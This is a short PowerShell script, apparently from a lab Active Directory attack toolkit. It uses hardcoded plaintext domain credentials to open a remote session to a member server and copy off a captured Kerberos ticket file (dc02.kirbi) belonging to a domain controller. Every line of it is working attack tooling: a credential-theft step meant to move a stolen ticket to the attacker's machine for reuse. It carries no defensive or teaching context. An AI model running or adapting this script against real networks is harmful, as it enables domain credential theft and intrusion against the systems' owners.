[CmdletBinding()]
param(
    [string]$TargetHost = "mbr01.child.cadre.local",
    [string]$Username = "child.cadre.local\analyst_t1",
    [string]$Password = "T13r_An@lyst!",
    [string]$RemoteKirbi = "C:\Windows\Temp\cadre-tools\T102-capture\dc02.kirbi",
    [string]$LocalDir = "C:\Tools\cadre-attack\T102-capture"
)
$ErrorActionPreference = "Stop"

New-Item -ItemType Directory -Path $LocalDir -Force | Out-Null

$cred = New-Object System.Management.Automation.PSCredential($Username, (ConvertTo-SecureString $Password -AsPlainText -Force))
$session = New-PSSession -ComputerName $TargetHost -Credential $cred
Copy-Item -Path $RemoteKirbi -Destination $LocalDir -FromSession $session -Force
Remove-PSSession $session

$local = Join-Path $LocalDir 'dc02.kirbi'
if (Test-Path $local) {
    $f = Get-Item $local
    Write-Output "KIRBI_LOCAL $($f.FullName)|$($f.Length) bytes"
} else {
    Write-Output "KIRBI_PULL_FAILED"
    exit 1
}
